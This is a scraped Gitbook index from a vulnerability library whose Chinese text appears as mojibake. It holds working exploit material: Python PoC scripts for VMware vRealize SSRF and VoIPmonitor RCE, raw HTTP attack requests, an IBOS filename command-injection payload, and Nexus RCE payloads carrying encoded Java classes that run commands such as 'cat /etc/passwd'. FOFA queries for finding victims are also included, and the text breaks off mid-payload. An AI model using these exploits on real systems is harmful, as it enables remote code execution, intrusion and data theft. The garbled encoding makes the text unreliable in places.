POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: VMware vRealize Operations Manager \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.com \\033[0m') print('+------------------------------------------') def POC_1(target_url, v): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json;charset=UTF-8\" } data = '[\"{}\"]'.format(Dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10) if response.status_code == 200 : print(\"\\033[32m[o] ÁõÆÊ†á {} ÂèØËÉΩÂ≠òÂú®SSRFÊºèÊ¥û,ËØ∑Ê£ÄÊü• Dnslog ÂìçÂ∫î \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VoIPmonitor/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VoIPmonitor/","title":"VoIPmonitor","keywords":"","body":"VoIPmonitor VoIPmonitor ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-30461 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VoIPmonitor/VoIPmonitor ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-30461.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VoIPmonitor/VoIPmonitor ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-30461.html","title":"VoIPmonitor ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-30461","keywords":"","body":"VoIPmonitor ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2021-30461 ÊºèÊ¥ûÊèèËø∞ VoIPmonitorÊòØ‚ÄúÂÖ∑ÊúâÂú®Linux‰∏äËøêË°åÁöÑSIP RTPÂíåRTCP VoIPÂçèËÆÆÁöÑÂÖ∑ÊúâÂïÜ‰∏öÂâçÁ´ØÁöÑÂºÄÊ∫êÁΩëÁªúÊï∞ÊçÆÂåÖÂóÖÊé¢Âô®‚Äù„ÄÇ ‰ΩøÁî®ÈÄöËøáWebÁïåÈù¢Âà∞ËææÁöÑÁî®Êà∑Êèê‰æõÁöÑÊï∞ÊçÆÔºåÂÖÅËÆ∏Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ãÁî®Êà∑Ëß¶ÂèëVoIPmonitor‰∏≠ÁöÑËøúÁ®ãPHP‰ª£Á†ÅÊâßË°åÊºèÊ¥û„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] VoIPmonitor FOFA [!NOTE] \"VoIPmonitor\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã index.phpÊñá‰ª∂‰∏≠ÁöÑÂÖ≥ÈîÆ‰ª£Á†Å $setConfigurationTypeValue_rslt = array(); if(file_exists('config/configuration.php')) { $existsConfiguration = true; if(isset($_POST['recheck'])) { if(!empty($_POST['SPOOLDIR'])) { setConfigurationTypeValue__index('SPOOLDIR', $_POST['SPOOLDIR']); } } ‰º†ÂÖ•ÂèÇÊï∞ recheck Âíå SPOOLDIRÔºå Âπ∂Â∞ÜSPOOLDIR ÂÜôÂÖ• config/configuration.php ‰∏≠ ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖ POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 29 SPOOLDIR=%2Ftmp&recheck=annen POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 49 SPOOLDIR=test%22.system%28id%29.%22&recheck=annen ÊàêÂäüÊâßË°åÂëΩ‰ª§ ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈîêÊç∑EGÁΩëÂÖ≥ cli.php RCE \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php\" data = {\"SPOOLDIR\": \"/tmp\", \"recheck\": \"annen\"} headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) POC_2(target_url) def POC_2(target_url): vuln_url = target_url + \"/index.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = {\"SPOOLDIR\": \"test\\\".system(id).\\\"\", \"recheck\": \"annen\"} print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°åÂëΩ‰ª§ id .....\\033[0m\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) if \"uid=\" in response.text: print(\"\\033[36m[o] ÊàêÂäüÊâßË°å id, ÁõÆÊ†áÂ≠òÂú®ÊºèÊ¥û.....\\033[0m\") else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") exit() except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/","title":"WebÂ∫îÁî®ÊºèÊ¥û","keywords":"","body":"WebÂ∫îÁî®ÊºèÊ¥ûü¶å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/SonarQube/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube SonarQube api ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-27986 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/SonarQube/SonarQube api ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-27986.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/SonarQube/SonarQube api ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-27986.html","title":"SonarQube api ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-27986","keywords":"","body":"SonarQube api ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-27986 ÊºèÊ¥ûÊèèËø∞ SonarQube ÊüêÊé•Âè£Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÂèØ‰ª•Ëé∑ÂèñÈÉ®ÂàÜÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] SonarQube FOFA [!NOTE] app=\"sonarQube-‰ª£Á†ÅÁÆ°ÁêÜ\" ÊºèÊ¥ûÂ§çÁé∞ ‰∏ªÈ°µÂ¶Ç‰∏ã ÊºèÊ¥ûPOC http://xxx.xxx.xxx.xxx/api/settings/values ÂèØÊ≥ÑÈú≤ÁöÑ‰∏∫ÔºöÊòéÊñáSMTP„ÄÅSVNÂíåGitlabÁ≠âÊïèÊÑü‰ø°ÊÅØ Goby & POC [!NOTE] SonarQube api Information leakage Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/IBOS/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/IBOS/","title":"IBOS","keywords":"","body":"IBOS IBOS Êï∞ÊçÆÂ∫ìÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/IBOS/IBOS Êï∞ÊçÆÂ∫ìÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/IBOS/IBOS Êï∞ÊçÆÂ∫ìÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"IBOS Êï∞ÊçÆÂ∫ìÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"IBOS Êï∞ÊçÆÂ∫ìÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ IBOS ÂêéÂè∞Êï∞ÊçÆÂ∫ìÊ®°Âùó Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖËøõÂÖ•ÂêéÂè∞ÂêéÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] IBOS FOFA [!NOTE] body=\"IBOS\" && body=\"login-panel\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã http://xxx.xxx.xxx.xxx/?r=dashboard/default/login ÊâæÂà∞Êï∞ÊçÆÂ∫ìÂ§á‰ªΩÊ®°Âùó Êèê‰∫§Âπ∂ÊäìÂåÖ ‰øÆÊîπfilenameÂèÇÊï∞ÂèëÈÄÅÂåÖ‰ºö‰∏ä‰º†test.phpÊñá‰ª∂Âà∞Ê†πÁõÆÂΩï backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=peiqi%26echo \"\">test%PATHEXT:~0,1%php%26test&dbSubmit=1 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/","title":"Nexus","keywords":"","body":"Nexus Nexus Repository Manger extdirect ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2019-7238 Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10199 Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10204 Nexus Repository Manger change-password ‰ΩéÊùÉÈôê‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†ÅÊºèÊ¥û CVE-2020-11444 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger extdirect ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2019-7238.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger extdirect ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2019-7238.html","title":"Nexus Repository Manger extdirect ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2019-7238","keywords":"","body":"Nexus Repository Manger extdirect ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2019-7238 ÊºèÊ¥ûÊèèËø∞ ËøëÊó•ÔºåÁ†îÁ©∂‰∫∫ÂëòÂèëÁé∞‰∫ÜÈÄöÁî®ËΩØ‰ª∂ÂåÖ‰ªìÂ∫ìÁÆ°ÁêÜÊúçÂä° Nexus Repository Manager 3 Â≠òÂú®ËÆøÈóÆÊéßÂà∂Áº∫Â§±ÂèäËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºåÊºèÊ¥ûÁºñÂè∑‰∏∫ CVE-2019-7238 ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Nexus ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" ÊºèÊ¥ûÂ§çÁé∞ ÂêéÂè∞È°µÈù¢Â¶Ç‰∏ãÔºå‰ªªÊÑè‰∏ä‰º† jarÂåÖ ÂèëÈÄÅËØ∑Ê±ÇÂåÖÊâßË°åÂëΩ‰ª§ POST /service/extdirect HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 7256 Connection: close {\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n y,\\n 'Exploit.Test234',\\n z.getBytes('latin1'), 0,\\n 3054\\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\\n\"}, {\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAssets\"} Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10199.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Nexus/Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10199.html","title":"Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10199","keywords":"","body":"Nexus Repository Manger group ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-10199 ÊºèÊ¥ûÊèèËø∞ Nexus ÂêéÂè∞Â≠òÂú®‰∏ÄÂ§Ñ‰ªªÊÑèELË°®ËææÂºèÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂè™ÈúÄË¶Å‰ªªÊÑè‰∏Ä‰∏™Áî®Êà∑ÊùÉÈôêÂç≥ÂèØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Nexus ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûËß¶ÂèëÈúÄË¶Å‰ªªÊÑèË¥¶Êà∑ÊùÉÈôê ÁôªÂΩï‰ªªÊÑèÁî®Êà∑Âêé‰øÆÊîπ NXSESSIONIDÔºåÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: Connection: keep-alive NX-ANTI-CSRF-TOKEN: 0.6153568974227819 Content-Length: 4789 X-Requested-With: XMLHttpRequest X-Nexus-UI: true Content-Type: application/json 404: \"id\" Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9